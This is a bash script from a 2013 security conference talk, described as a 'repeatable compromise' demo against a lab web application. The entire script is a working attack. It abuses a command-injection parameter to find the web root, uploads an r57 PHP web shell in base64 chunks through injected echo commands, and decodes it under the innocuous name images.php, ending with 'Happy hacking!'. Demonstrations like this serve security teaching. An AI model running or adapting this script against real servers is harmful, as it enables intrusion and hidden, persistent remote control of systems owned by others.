#!/bin/bash

#
# Quick and nasty "repeatable compromise" script
# PLUK13 Security talk
# David Busby <david.busby@percona.com>
# Copyright 2013 Percona LLC / David Busby
#

vuln_webapp="http://172.16.33.2/vuln_webapp"
echo "Phase 1 - Information gathering"
webdir=`curl -s ${vuln_webapp}/cmdi.php?cmd=pwd | grep www`
echo "I detected the webdir as $webdir"
echo "Phase 2 - create payload"
i=0
cmd="echo '' > $webdir/images.b64"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
base64 -w 100 r57.php | while read chunk
do
    (( i++ ))
    chunk_inject="echo -n '$chunk' >> $webdir/images.b64"
    echo "Executing payload line $i: $chunk_inject";
    cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$chunk_inject")"
    curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
done
echo "Phase3 - unpacking payload"
cmd="base64 -d $webdir/images.b64 > $webdir/images.php"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null

echo "Payload staged webshell should be available here $vuln_webapp/images.php"
echo "Happy hacking!"
